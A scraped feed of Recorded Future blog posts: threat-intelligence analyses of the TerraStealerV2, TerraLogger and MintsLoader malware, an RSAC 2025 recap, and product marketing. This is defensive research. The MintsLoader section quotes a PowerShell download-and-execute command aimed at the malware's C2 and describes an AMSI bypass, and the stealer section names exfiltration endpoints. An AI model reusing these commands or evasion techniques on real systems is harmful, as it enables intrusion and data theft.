        <p>Exfiltrated browser login data and informational messages are written to C:\ProgramData\file.txt and copied to %LOCALAPPDATA%\Packages\Bay0NsQIzx\p.txt when stealing operations have completed. If found, targeted browser extensions and wallets have their directories copied to %LOCALAPPDATA%\Packages\Bay0NsQIzx, and a Telegram message is sent indicating the number of crypto wallets found. The contents of %LOCALAPPDATA%\Packages\Bay0NsQIzx are subsequently compressed into an archive named output.zip, located in the same directory. The archive is then exfiltrated to the Telegram bot and a secondary C2 endpoint hosted at <em>wetransfers[.]io/uplo.php</em>, as shown in <strong>Figure 7</strong>. The domain wetransfers[.]io was registered on February 18, 2025, via NameCheap, Inc., and is currently hosted behind Cloudflare infrastructure.</p>

        <h4>Distribution</h4>
        <p>Insikt Group has identified multiple delivery mechanisms employed in the distribution of TerraStealerV2, including executable files (EXEs), dynamic-link libraries (DLLs), Windows Installer packages (MSI), and shortcut (LNK) files. Across all observed cases, the TerraStealerV2 OCX payload was retrieved from the URL wetransfers[.]io/v.php — a resource hosted on the same domain leveraged for data exfiltration — using either curl or PowerShell, and subsequently executed via regsvr32.exe (see <strong>Figure 8</strong>).</p>

In this case, the LNK file dropped a payload masquerading as an MP4 file, which was executed via mshta.exe — a technique consistent with previously observed tactics in ClickFix campaigns.</p>

        <h2>TerraLogger</h2>
        <p>Insikt Group identified a new keylogger associated with Golden Chickens, which was uploaded to Recorded Future Malware Intelligence on January 13, 2025. Insikt Group tracks this family as TerraLogger and has identified five distinct samples. Four samples operate as intended and contain an identical PDB string, shown in <strong>Figure 9</strong> below. The remaining sample does not include this PDB string and instead uses the same PDB path as TerraStealerV2 (see <strong>Figure 3</strong> above). This outlier appears to be a developer test, using the same string-encoding method as TerraStealerV2; however, it fails during execution due to a crash while initializing keylogger-related strings, which prevents the malware from reaching its primary entry point.</p>

        <p>TerraLogger is typically delivered as an OCX file and employs the same initial execution checks as TerraStealerV2. It is intended to be executed via regsvr32.exe, which invokes the DllRegisterServer export function. Upon execution, it first checks that the provided file has a .ocx extension and that the filename ends with a hard-coded character or digit (such as 0.ocx). It then verifies that it is being run by regsvr32.exe before proceeding. If the initial execution checks pass, TerraLogger opens a file handle to log keystrokes.</p>
        <p>Insikt Group identified multiple file paths across the five identified samples, with logs written to files such as a.txt, f.txt, op.txt, or save.txt located in the C:\ProgramData folder. The malware implements its keylogger using a commonly observed technique by installing a WH_KEYBOARD_LL hook using <a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookExA</a>, registering the fn callback function (shown in <strong>Figure 10</strong>) to intercept and process message events, enabling keyboard activity to be captured.</p>

        <p>Keystrokes are written to the open log file within the mw_log_key function. This function first retrieves the title of the current foreground window, then appends a line separator followed by the intercepted keystrokes. It contains logic to handle special characters, such as semicolons, brackets, and quotes, and checks the state of the Shift key to determine the correct character to log. If a keycode does not match any known special keys, it is written in &lt;KEY-[keycode]&gt; format. An example of a resulting log file is shown in <strong>Figure 11</strong>.</p>

Compilation timestamps indicate that the first version was built on January 13, 2025, and that the most recent sample was compiled on April 1, 2025. These samples reflect minor, incremental updates, suggesting active development. Notable changes include modifications to the file path used for storing keystroke logs and a shift in how special keys are represented — from angle-bracketed, uppercase tokens (for example, , ) to pipe-delimited, lowercase abbreviations (for example, |bck|, |sft|).</p>

            <description><![CDATA[There was much to see at RSAC 2025. Read the recap about a few highlights from the expo floor.]]></description>
            <content:encoded><![CDATA[
        <p>The 2025 RSA Conference in San Francisco once again showcased the cutting edge of cybersecurity innovation. This year's expo floor was particularly vibrant, reflecting how the industry continues to evolve in response to increasingly sophisticated threats. As I navigated the bustling halls, I noted key highlights and trends that are notable for the conference and shaping the security market.</p>
        <h3>AI Assisted Security Operations</h3>
        <p>The most prominent theme throughout the expo was the integration of advanced AI into security tools. This year's offerings demonstrated AI assisted capabilities that provide actionable intelligence and simplify complex tasks. Several vendors showcased platforms that went beyond just incorporating AI but now take actions to offload some of the work of security practitioners. When businesses need to do more with less along with the struggle to find security talent, this should go a long way.</p>
        <h3>The Spectrum of Threat Intelligence</h3>
        <p>One thing that caught my eye when walking the expo floor was the number of vendors and booths displaying Threat Intelligence signage prominently on their displays and TVs. After talking to reps at the booths, it was clear that there is a wide spectrum of threat intelligence available, and it is important to know which type works best for you and asking what sort of threat intelligence the vendor is offering. One one end of the spectrum, you have some vendors are providing true first-party threat (first-party threat intelligence—data collected directly by the vendor through their own sensors, honeypots, and research teams—providing unique visibility that can't be found elsewhere) intelligence, while the other end of the spectrum are vendors providing threat intelligence in their products that consists of the ability to take in an open source feed.</p>
        <h3>Animals of Cybersecurity Marketing</h3>
        <p>A big highlight of the expo were two vendors taking a decidedly analog approach to standing out on the crowded RSAC expo floor. Attendees could take a break from technical discussions to spend a few minutes cuddling the puppies who were available for adoption. Just across the room, a small pen of miniature goats complete with hay bales and "Greatest Of All Time (GOAT)" signage, created an effective contrast to the high-tech solutions being pitched. Both animal-themed booths proved that in the battle for attendee attention, sometimes the most effective strategy is simply offering a moment of joy amid the cybersecurity intensity.</p>
        <p>

        </p>
        <p>
          <img loading="lazy" alt="rsac-recap-002.jpg" src="https://www.recordedfuture.com/media_1cc12c23b499c9642114b962302910d24d2197c78.jpg?width=750&amp;format=jpg&amp;optimize=medium" width="1600" height="1200" />
        </p>
        <h2>Recorded Future’s Branding and Malware Intelligence on the Expo Floor</h2>
        <p>A highlight for me was seeing Recorded Future’s new brand on display front and center on the show floor with the new electric blue and bold red accent colors. The boldness of the brand stood out amid a sea of sameness – dark displays, matrix-like code animations, and ubiquitous hooded figures – and captured what Recorded Future is all about. When organizations are facing increasingly sophisticated threats, they need a bold partner that stands out from the others with clarity, focus, and actionable insights.</p>
        <p>
          <img loading="lazy" alt="rsac-recap-003.jpg" src="https://www.recordedfuture.com/media_190c1a1b21d6052c0c7d7b247716ebeaa92e53cce.jpg?width=750&amp;format=jpg&amp;optimize=medium" width="1600" height="1200" />
        </p>
        <p>Coupling the new brand with the launch of Recorded Future’s new Malware Intelligence offerings made the booth one of the must see stops as attendees made their way around the floor. Attendees were able to see demos of the product and see for themselves how Malware Intelligence helped achieve the following outcomes:</p>
        <ul>
          <li>Reduction in time spent analyzing malware samples</li>
          <li>Automated malware detection at scale</li>
          <li>Shift from reactive to proactive and spot emerging threats before they become a problem</li>
        </ul>
        <p><strong>The average team saves 11 hours weekly on threat analysis, hunting, and reporting efforts with Recorded Future Malware Intelligence (<a href="http://uevi.co/6959AEDT">Source</a>)</strong></p>
        <p>The team also discussed the new capabilities available with Malware Intelligence including malware hunting, Auto YARA Rules, and malware Alerts.</p>
        <p>
          <img loading="lazy" alt="rsa-recap-004.png" src="https://www.recordedfuture.com/media_13bf66effdf6c1573b38851de73f984641bec4186.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="1062" />
        </p>
        <p>Don’t worry if you were unable to stop by the booth, you can find more information on Malware Intelligence on the new Recorded Future website at <a href="http://www.recordedfuture.com/malware-intelligence">www.recordedfuture.com/malware-intelligence</a>.</p>
        <h2>Looking Ahead</h2>
        <p>As I left the expo floor, it was clear that the cybersecurity industry continues its march toward more integrated, intelligence-driven approaches. The vendors that stood out weren't those with the flashiest booths or the most aggressive marketing—they were those offering genuine advancements in connecting disparate security data points into coherent, actionable intelligence. As the conference comes to a close, it was great to hear all the new ideas, see the keynotes, and network with other security practitioners. I look forward to RSAC 2026 and I am curious what animals might be on the show floor next year.</p>

            <description><![CDATA[Discover how MintsLoader operates as a stealthy, obfuscated malware loader distributing GhostWeaver, StealC, and BOINC. Read Recorded Future’s in-depth analysis of its evasion tactics, DGA-based C2s, and use in phishing and drive-by campaigns.]]></description>
            <content:encoded><![CDATA[
        <p>
          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>MintsLoader, a malicious loader, was first observed in multiple phishing and drive-by download campaigns as early as 2024. The loader commonly deploys second-stage payloads such as GhostWeaver, StealC, and a modified BOINC (Berkeley Open Infrastructure for Network Computing) client. MintsLoader operates through a multi-stage infection chain involving obfuscated JavaScript and PowerShell scripts. The malware employs sandbox and virtual machine evasion techniques, a domain generation algorithm (DGA), and HTTP-based command-and-control (C2) communications.</p>
        <p>MintsLoader has been observed being used by various threat groups; however, operators of TAG-124 (also known as LandUpdate808) have used it extensively. The loader is deployed through multiple infection vectors, including phishing emails targeting the industrial, legal, and energy sectors (TAG-124); compromised websites impersonating browser update prompts (SocGholish); and invoice-themed lures distributed via Italy’s PEC certified email system.</p>
        <p>MintsLoader’s use of obfuscation complicates static detections such as YARA rules, its use of DGA-based C2 infrastructure makes it difficult to maintain up-to-date watchlists or blocklists, and its anti-analysis techniques complicate host-based detections that rely on sandboxes or virtualization. But Recorded Future’s Malware Intelligence Hunting identifies new MintsLoader samples and associated C2 domains and provides an up-to-date list for blocklists or threat hunting.</p>
        <p>MintsLoader’s persistent use of obfuscation, sandbox evasion, and adaptive infrastructure likely ensures its continued presence within the malware ecosystem, likely leading to increased use by additional threat actors. The malware’s role as a versatile delivery mechanism reflects the increasing professionalization and specialization within the cybercriminal community. While this growing sophistication benefits threat actors by enabling more resilient and efficient operations, it may simultaneously provide opportunities for defenders to identify and disrupt malicious activity more effectively and at scale.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>MintsLoader's second-stage PowerShell script uses sandbox and virtual environment evasion techniques, reducing its susceptibility to automated analysis and increasing its likelihood of bypassing dynamic detection tools.</li>
          <li>MintsLoader's use of a DGA to generate daily C2 domains based on the system date complicates infrastructure monitoring activity and domain/IP-based detections.</li>
          <li>Recorded Future’s Malware Intelligence Hunting provides up-to-date C2 domains and other artifacts related to MintsLoader that would otherwise be hard to track due to its dynamic infrastructure.</li>
          <li>Insikt Group shows that GhostWeaver is the primary payload deployed by MintsLoader across observed campaigns.</li>
          <li>GhostWeaver’s self-signed X.509 certificates are similar to those of AsyncRAT and variants of AsyncRAT, leading to initial false associations with other malware families such as AsyncRAT.</li>
        </ul>
        <h2>Background</h2>
        <p><a href="https://github.com/cert-orangecyberdefense/mintsloader">Orange Cyberdefense</a> first detected MintsLoader in widespread distribution campaigns between July and October 2024. Insikt Group identified earlier campaigns in February 2024, based on Palo Alto’s Unit42 <a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-02-21-IOCs-from-SocGholish-AsyncRAT-infection.txt">analysis</a> of a SocGholish infection.</p>
        <p>The loader consists of JavaScript (stage one) and PowerShell (stage two) scripts retrieved from multiple DGA-based domains. The name “MintsLoader” is derived from its distinctive use of the URL parameter s=mints[NUMBER] (for example, s=mints11). MintsLoader is typically <a href="https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983">observed</a> in campaigns delivering secondary payloads such as GhostWeaver, StealC, and the Berkeley Open Infrastructure for Network Computing (BOINC) client.</p>

        </div>
        <p>While MintsLoader is believed to be used by multiple threat actors, TAG-124 (also known as LandUpdate808) infections have frequently been observed deploying MintsLoader. Additionally, threat actors using SocGholish were early adopters of MintsLoader, resulting in the initial assessment of MintsLoader campaigns as being exclusively associated with SocGholish. For example, in February 2024, Palo Alto’s Unit42 <a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-02-21-IOCs-from-SocGholish-AsyncRAT-infection.txt">released</a> indicators linked to SocGholish (Figure 2); however, Insikt Group's analysis indicates that the URLs identified as delivering AsyncRAT also align with known MintsLoader URL patterns.</p>

        <p>Below are recently reported campaigns involving MintsLoader.</p>
        <h3>MintsLoader and Kongtuke/ClickFix pages</h3>
        <p>In early 2025, security analysts <a href="https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery">observed</a> a phishing campaign delivering MintsLoader as a first-stage loader. Phishing emails (targeting the energy, oil and gas, and legal sectors in the US and Europe​) carried either a malicious JavaScript attachment or a link to a fake “Click to verify” web page​. <strong>Figure 4</strong> shows examples of ClickFix pages.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="malware-hunting-004.png" src="https://www.recordedfuture.com/media_18bb150fb50ca1b1d1486c310c9c1658aac52a482.png?width=750&amp;format=png&amp;optimize=medium" width="875" height="552" />
            </div>
          </div>
          <div>
            <div><strong><em>Figure 4:</em></strong> <em>Examples of ClickFix pages (Source:</em> <em><a href="https://www.hhs.gov/sites/default/files/clickfix-attacks-sector-alert-tlpclear.pdf">https://www.hhs.gov/</a>)</em></div>
          </div>
        </div>
        <p>In both cases, the result was the execution of MintsLoader’s PowerShell-based second stage on the victim’s machine. This loader pulled down the final payloads, notably the StealC infostealer and a modified BOINC client build. The <a href="https://thehackernews.com/2025/01/mintsloader-delivers-stealc-malware-and.html">campaign</a> leveraged fake CAPTCHA verification pages (ClickFix/KongTuke lures) to trick users into executing a copied PowerShell command, which downloaded and ran MintsLoader (<strong>Figure 5</strong>).</p>

        <p>Other <a href="https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery">infection</a> chains in this campaign delivered MintsLoader via a downloaded ‘Fattura########.js’ file (Italian for “invoice”) that victims opened, leading to the same PowerShell loader execution​. Researchers at eSentire’s Threat Response Unit reported this campaign and noted the threat actors’ focus on industrial and professional services targets across North America and Europe.</p>
        <h3>SocGholish “FakeUpdates” Campaigns</h3>
        <p>Multiple reports indicate (<a href="https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983">1</a>, <a href="https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software#:~:text=Beginning%20on%20July%204%2C%202024%2C,such%20as%20AsyncRAT%20or%20NetSupport">2</a>) that the SocGholish (FakeUpdates) threat actors incorporated MintsLoader into their operations. Starting around July 2024, SocGholish infections from compromised websites showed infection chains installing the BOINC-distributed computing client via MintsLoader.</p>
        <p>In this drive-by campaign, shown in <strong>Figure 6</strong>, victims browsing legitimate but compromised sites encountered fake browser update prompts (often originating from an update.js script). If run, the malicious JavaScript fetched an obfuscated MintsLoader payload, kicking off a multi-step PowerShell sequence.</p>

        <p>Huntress Labs documented two parallel outcomes: one branch resulted in a fileless AsyncRAT running in memory, while the other led to a stealth BOINC installation under attacker control. The BOINC deployment was notably modified and configured to connect to a malicious C2 rather than the standard BOINC server.</p>
        <p>In some cases, the GhostWeaver PowerShell <a href="https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983">backdoor</a> (tracked by Mandiant as UNC4108) was also delivered via MintsLoader, providing attackers with a persistent foothold and a platform to load additional plugins.</p>
        <h2>Invoice Phishing in Europe</h2>
        <p>Another MintsLoader campaign in late 2024 <a href="https://www.spamhaus.org/resource-hub/cybercrime/pec-invoice-scam/#the-pec-%22invoice-scam%22">targeted</a> European organizations via invoice-themed phishing emails​, an example of which is shown in Figure 7. Spam messages leveraged Italy’s PEC (certified email) system to add legitimacy and lured recipients into opening attached JavaScript files masquerading as invoices. The Spamhaus research team dubbed this the “PEC invoice scam” and highlighted how the attackers abused trusted email channels to bypass security checks. This campaign was noted for “stealing time, money, and trust from businesses.”</p>

        <h2>Technical Analysis</h2>
        <p>MintsLoader uses a multi-stage execution chain involving JavaScript and PowerShell, with each stage employing obfuscation to hinder analysis. Although MintsLoader functions solely as a loader without supplementary capabilities, its primary strengths lie in its sandbox and virtual machine evasion techniques and a DGA implementation that derives the C2 domain based on the day it is run. These features significantly complicate static analysis and host-based detection. Despite this, its C2 communications occur over HTTP, which provides a reliable vector for detecting and identifying new samples. <strong>Figure 8</strong> provides the high-level capabilities of MintsLoader.</p>

        <h2>MintsLoader Attack Chain</h2>
        <p>MintsLoader is commonly delivered via phishing emails containing links to KongTuke or ClickFix pages. When executed, these pages retrieve and run the first stage of JavaScript. The JavaScript is heavily obfuscated, and execution leads to running a PowerShell command to download and execute the second stage of MintsLoader, as shown in <strong>Figure 9</strong>.</p>
        <div>
          <div>
            <div>

          </div>
        </div>
        <p>This second stage conducts environment checks to determine whether it is running in a sandbox or virtualized setting. Next, the script uses a DGA to produce the next C2 domain. MintsLoader then attempts to contact the generated domain to download the final payload, such as GhostWeaver, StealC, or the BOINC client. Figure 10 shows a high-level overview of this attack chain.</p>

        <h2>Stage One: JavaScript</h2>
        <p>The initial stage of MintsLoader consists of a JavaScript file that executes a PowerShell command to retrieve the second stage. The script is heavily obfuscated using junk comments, non-readable variables and function names, character replacement, and string encoding (<strong>Figure 11</strong>). Insikt Group found 141 MintsLoader stage one samples using data derived from Recorded Future Malware Intelligence Hunting (<strong>Appendix A</strong>).</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="malware-hunting-011.png" src="https://www.recordedfuture.com/media_18b5e50ffbc85160bf00d205c52ad1afaa4481e7b.png?width=750&amp;format=png&amp;optimize=medium" width="1301" height="561" />

          </div>
        </div>
        <p>The core function of the stage one JavaScript payload is to run a PowerShell command that executes the command ‘curl -useb http://[domain]/1.php?s=[campaign]’, which downloads and executes the second stage. When ‘curl’ is used in PowerShell with the option ‘-useb’, it is an alias for Invoke-WebRequest, and the program cURL is not actually used to make the HTTP request.</p>
        <p>Insikt Group identified three distinct versions of the stage one loader, all of which employ the same JavaScript obfuscation techniques but differ in implementing the deployed PowerShell.</p>
        <p>The first variant executes the PowerShell command in clear text, with the C2 domain hard-coded, as shown in <strong>Figure 12</strong>. This variant is seen in “mints13” and “flibabc11” campaigns.</p>

          </div>
        </div>
        <p>In the second variation, the PowerShell command is obfuscated using character replacement. The C2 domain is still hard-coded, and an alias for the curl command is used instead, but the object is still to download the next stage (<strong>Figure 13</strong>). This is the most widely used variant across the campaigns: “flibabc21”, “flibabc22”, ”mints11”, “mints13”, “mints21”, and “mints42”.</p>

        <h2>Stage Two PowerShell</h2>
        <p>The second stage, PowerShell, contains a Base64-encoded string. After XOR decoding and uncompressing, the primary payload, which is also obfuscated, is yielded. Figure 17 shows a snippet of this payload, illustrating MintsLoader's obfuscated string construction techniques.</p>

          </div>
        </div>
        <p>After the initial deobfuscation and decoding, the second stage of PowerShell starts by attempting to bypass Antimalware Scan Interface (AMSI) using a known <a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/">technique</a> to fake AMSI initialization failure: setting the variable amsiInitFailed of the System.Management.Automation.AmsiUtils object to TRUE.</p>
        <p>The rest of the code is responsible for executing three system information queries: the return values used in logical expressions to detect whether the system is running on bare metal, sandbox, or virtual machine. This is conveyed to the C2 through an integer variable sent as the URL parameter key, and the C2 examines its value to determine if its response will return a third stage that downloads the final payload or a decoy. It should be noted that the constant integer values used to increment the key variable change with each second-stage sample.</p>
        <p>The result of each system information query is checked against three logical expressions, the order of which varies per sample, along with constants that increment the key, whose results affect the key variable value. The logical expressions may not provide apparent results on initial inspection. For example, if the first deobfuscated system check, shown below in <strong>Figure 18</strong>, were to run on a virtual machine, the $isVirtualMachine variable would be equal to $true. The logical expression "$true -eq 3" evaluates to $true in PowerShell, increasing the key by 15310805757 instead of 83670406277.</p>

This determines whether the infected system is running on an emulator or virtually. Typically, a Windows system will return "Internal" and/or "Integrated RAMDAC," which would increment the key by 14467965888 in this example.</p>

        <p>The system checks and calculation of the key are followed by generating a random seed based on the date and a constant, which is used with a system.Random object to construct the domain using a simple DGA and the URL path, as shown in <strong>Figure 21</strong>. The author may have made a mistake by not using the second random variable to construct the URL path. Instead, they use an undefined variable for the URL path ending, making the URL path ending a constant "htr.php". Note that in PowerShell, curl is an alias for Invoke-WebRequest, which is used to generate the request to the C2 for the third stage, so the User-Agent HTTP header will include PowerShell version information, not curl.</p>

        <h3>Stage Two C2 Communication</h3>
        <p><strong>Figure 22</strong> shows an example of a MintsLoader request for the final payload, with a URL path ending in htr.php. The URL parameter id is the hostname, and the URL parameter s is the campaign ID.</p>

        <p>If the second-stage request does not meet specific requirements, the final payload may lead to a decoy executable (<strong>Figure 24</strong>), as in <a href="https://tria.ge/230922-q9ft4sac82/behavioral1">this</a> example, which leads to an AsyncRAT <a href="https://levelblue.com/blogs/labs-research/asyncrat-loader-obfuscation-dgas-decoys-and-govno">decoy</a> executable downloaded from the site temp[.]sh. This association with AsyncRAT led to initial naming in reports and some countermeasures for network traffic as "AsyncRAT Loader", which causes MintsLoader malware samples to be incorrectly tagged as AsyncRAT even though current MintsLoader campaigns do not deploy AsyncRAT.</p>

        </div>
        <h3>GhostWeaver</h3>
        <p>One of the most commonly observed payloads deployed by MintsLoader is <a href="https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983">GhostWeaver</a>, a PowerShell-based remote access trojan (RAT) exhibiting code similarities and functional overlaps with MintsLoader. Notably, GhostWeaver can <a href="https://tria.ge/250225-njxc3awjs8/behavioral2">deploy</a> MintsLoader as an additional payload via its sendPlugin command. Communication between GhostWeaver and its command-and-control (C2) server is secured through TLS encryption using an obfuscated, self-signed X.509 certificate embedded directly within the PowerShell script, which is leveraged for client-side authentication to the C2 infrastructure.</p>
        <p>GhostWeaver has periodically been misclassified as AsyncRAT. Insikt Group assesses with moderate confidence that this misclassification originated from Palo Alto Networks <a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-02-21-IOCs-from-SocGholish-AsyncRAT-infection.txt">initially</a> identifying a GhostWeaver sample (SHA256: fb0238b388d9448a6b36aca4e6a9e4fbcbac3afc239cb70251778d40351b5765) as a fileless AsyncRAT variant. GhostWeaver and AsyncRAT share certain characteristics within their self-signed X.509 certificates, such as identical expiration dates and serial number lengths; however, these similarities may simply reflect common certificate-generation methods rather than meaningful operational overlap.</p>
        <h2>MintsLoader Infrastructure</h2>
        <p>Insikt Group initially found MintsLoader C2 servers hosted solely on BLNWX but later observed its growing use of other ISPs such as Stark Industries Solutions Ltd (AS44477), GWY IT Pty Ltd.​ (AS199959), or SCALAXY-AS (58061), among others. MintsLoader C2 IP addresses announced via SCALAXY-AS are operated by hosting providers 3NT Solutions LLP and IROKO Networks Corporation, both of which are a part of the Russian-language bulletproof hosting provider Inferno Solutions (inferno[.]name). The switch to SCALAXY-AS and Stark Industries Solutions suggests that MintsLoader operators have shifted from relying on anonymous virtual private server (VPS) providers to more traditional bulletproof hosters, likely in an effort to harden their infrastructure against takedown attempts and enhance operational stability.</p>
        <p>Over the past several months, Insikt Group has identified a range of suspected additional campaign IDs and payloads (<strong>Table 2</strong>). This data is compiled from open research and Insikt Group’s internal research.</p>

            <description><![CDATA[Recorded Future’s Malware Intelligence rethinks traditional malware analysis to empower organizations to act first against modern threats.]]></description>
            <content:encoded><![CDATA[
        <p>In my conversations with security leaders across industries, I hear a consistent theme: traditional approaches to malware detection and analysis are failing to keep pace with the evolving threat landscape. This challenge has become even more pronounced as adversaries increasingly leverage AI to accelerate and enhance their attacks.</p>
        <p>The statistics tell a sobering story. The average dwell time for threats in 2024 remains at approximately 10 days. Nearly half of CISOs report missing data breaches with their existing security tools. And 93% of malware hides in data-in-transit<sup>1</sup>. These aren't just numbers—they represent real business risk that security teams struggle to address with limited resources and reactive approaches.</p>
        <p>Today, I'm excited to announce a solution that fundamentally transforms how organizations defend against malware: <strong>Recorded Future's Malware Intelligence</strong>.</p>
        <h2>Beyond Isolated Analysis</h2>
        <p>Traditional malware analysis happens in isolation—disconnected from the broader threat landscape. Security teams spend countless hours manually investigating samples without the contextual intelligence needed to understand their true risk or deploy effective protections quickly.</p>
        <p>Malware Intelligence fundamentally changes this approach by connecting every malware sample to our Intelligence Graph's 15+ years of threat and malware data. This allows security teams to not just analyze what the malware does, but understand its lineage, predict its evolution, and automatically generate protections—giving you complete context and automated defenses in seconds rather than days.</p>
        <h2>The Power of the Intelligence Graph</h2>
        <p>What makes this approach possible is the Recorded Future Intelligence GraphⓇ—the world's only threat intelligence repository with over 200 billion nodes of interconnected data built over 15 years. By leveraging this unmatched intelligence foundation, we've created capabilities that transform malware defense from a reactive exercise to a proactive strategy:</p>
        <ol>
          <li><strong>Intelligence Graph correlation</strong> with 1.5M+ new malware samples/day providing immediate context about origins, attribution, and potential impact</li>
          <li><strong>Auto YARA rule generation</strong> powered by pattern recognition creates instant protection against identified threats and their variants</li>
          <li><strong>Dynamic alerting</strong> identifies emerging threats through static and behavioral analysis before they target your organization</li>
          <li><strong>Seamless integration</strong> with existing security controls enables immediate protection without workflow disruption</li>
          <li><strong>Advanced Sandbox</strong> empowers security teams to upload and and detonate potential malware in an interactive environment, unlocking deep insights into threat behavior and attack strategies - <a href="/get-started#free-tools">try it free today</a> and see the difference.</li>
        </ol>
        <h2>Transforming Cyber Operations</h2>
        <p>For security teams, the impact is transformative. One customer described our approach as making their team "look prophetic"—they could get out in front of threats before they materialized rather than constantly reacting to incidents.</p>
        <p>Early adopters are reporting remarkable results including 3x reduction in triage time and ability to run threat hunts automatically.</p>
        <p>These aren't just efficiency metrics—they represent a fundamental shift in how security teams operate and the level of protection they can provide to their organizations.</p>
        <h2>From Manual to Automated, From Reactive to Proactive</h2>
        <p>What excites me most about Malware Intelligence is how it addresses the critical challenges facing security teams today:</p>
        <ul>
          <li><strong>For resource-constrained teams</strong>, it provides automation that eliminates hours of manual rule-writing and scales threat hunting capabilities without adding headcount</li>
          <li><strong>For organizations struggling with alert fatigue</strong>, it delivers high-confidence intelligence that focuses teams on what matters most</li>
          <li><strong>For security leaders concerned about emerging threats</strong>, it provides predictive capabilities that identify variants before they impact your systems</li>
        </ul>
        <p>Most importantly, it enables security teams to shift from a reactive posture—where they're constantly on the back foot against attackers—to a proactive strategy where they can anticipate and prevent attacks before they occur.</p>
        <h2>The Future of Intelligence-Driven Security</h2>
        <p>Malware Intelligence represents a significant step in our vision to enable you to know what matters and act first. By connecting the dots between isolated malware samples and the broader threat landscape, we're enabling security teams to defend at the speed and scale that modern threats demand.</p>
        <p>As attack techniques continue to evolve with the aid of AI, the advantage will belong to those with superior intelligence capabilities. That's precisely what we're delivering with Malware Intelligence—a capability that transforms how organizations detect, understand, and respond to malware threats that matter most to their business.</p>
        <p>This is available today for all our customers who own our Threat Intelligence Module. I invite you to see this innovation in action. Visit us at RSA Conference 2025 (Booth #926) or <a href="/get-started#book-demo">request a personalized demonstration</a> to experience how <a href="http://recordedfuture.com/products/threat-intelligence/malware-intelligence">Malware Intelligence</a> can transform your cyber operations.</p>

            <description><![CDATA[Threat actors could be hiding in plain sight within your network traffic. Don’t let overwhelming security data mean less visibility to threats.]]></description>
            <content:encoded><![CDATA[
        <p>Security teams are drowning in data, yet many struggle to extract actionable insights. As threats grow more complex, the <a href="https://www.cisa.gov/resources-tools/resources/enhanced-visibility-and-hardening-guidance-communications-infrastructure">demand</a> for visibility has never been greater. But more data does not always mean better security outcomes. 63% of daily alerts are low priority or false positives, causing SOC analysts to <a href="https://panther.com/blog/identifying-and-mitigating-false-positive-alerts#:~:text=found%20that%20an%20estimated%20one%2Dthird%20of%20their%20workday%20is%20spent%20on%20incidents%20that%20are%20not%20real%20threats%2C%20with%20FP%20and%20low%2Dpriority%20alerts%20comprising%20roughly%2063%25%20of%20daily%20alerts.">report</a> spending nearly a third of their time on incidents that pose no real threat. At the same time, 58% of analysts <a href="https://finitestate.io/blog/industry-report-false-positives-software-security#:~:text=58%25%20said%20false%20positives%20take%20more%20time%20to%20resolve%20than%20true%20positives">report</a> that false positives take more time to resolve than actual threats. Without the right tools and methods to interpret this information, more data just means more noise. This results in a visibility paradox: the more security data that is collected, the harder it becomes to spot real threats.</p>
        <h2>How Threat Actors Exploit the Visibility Paradox</h2>
        <p>Threat actors are capitalizing on this paradox. Recorded Future’s analysis of tactics, techniques, and procedures (TTPs) shows that threat actors are exploiting everyday traffic patterns and system behaviors to operate undetected, effectively hiding in plain sight.</p>
        <ul>
          <li><strong>250% Spike in Camouflaged Communication:</strong> The use of the application layer protocol (T1071) for command-and-control operations, disguised as routine network traffic, increased by over 250% between 2023 and 2024. Nearly half of all data exfiltration incidents tracked by Recorded Future in 2024 involved this technique.</li>
          <li><strong>Use of Malicious Infrastructure to Blend in with Web Traffic:</strong> Multiple threat actors are taking <a href="/research/tag-124-multi-layered-tds-infrastructure-extensive-user-base">advantage</a> of specialized malicious traffic-distribution systems that rapidly rotate URLs to evade static blocking mechanisms. This allows malicious infrastructure to mimic legitimate web activity and bypass conventional defenses.</li>
          <li><strong>33% Increase in System Information Discovery:</strong> Between 2023 and 2024, there was an uptick in the use of discovery tactics that allow threat actors to map and understand the target environment. System information discovery enables defense evasion techniques that commonly appear in ransomware, like disabling or modifying tools or modifying registry.</li>
        </ul>
        <p>Threat actors often rotate through indicators such as IP addresses, file hashes, and domains, reducing the effectiveness of static detections. Without careful tuning, alerts triggered by suspicious discovery or C2 behavior can generate high levels of false positives on legitimate processes or normal network traffic.</p>
        <h2>Automation and Specialization Create Even More Noise</h2>
        <p>Two trends are likely to fuel an increase in this activity. First, threat actors are specializing more than ever, allowing for sophisticated exploits across specific areas of the cyber kill chain. The <a href="/research/initial-access-brokers-key-to-rise-in-ransomware-attacks">rise</a> of initial access brokers and recent <a href="https://www.darkreading.com/threat-intelligence/vextrio-tds-biggest-cybercrime-operation-web">discoveries</a> of specialized access and C2 infrastructure highlight this shift. Second, threat actors are increasingly using AI tools. While malware isn’t autonomous yet, threat actors are exploiting LLMs and machine learning to automate and randomize delivery infrastructure, such as by <a href="https://blogs.infoblox.com/threat-intelligence/rdgas-the-next-chapter-in-domain-generation-algorithms/">registering</a> thousands of unique domain names daily for malicious use. The volume and randomness make these domains extremely difficult to detect or block.</p>
        <h2>Beat the Paradox by Making the Most of Data</h2>
        <p>Behavior-based detection, rather than static indicators, is pivotal to catching these threats. However, collecting enough data to understand behavior can exacerbate the visibility paradox if defenders don’t have a strategy for making sense of their alerts. This is where better analytics and intelligence-driven hunting can help:</p>
        <ul>
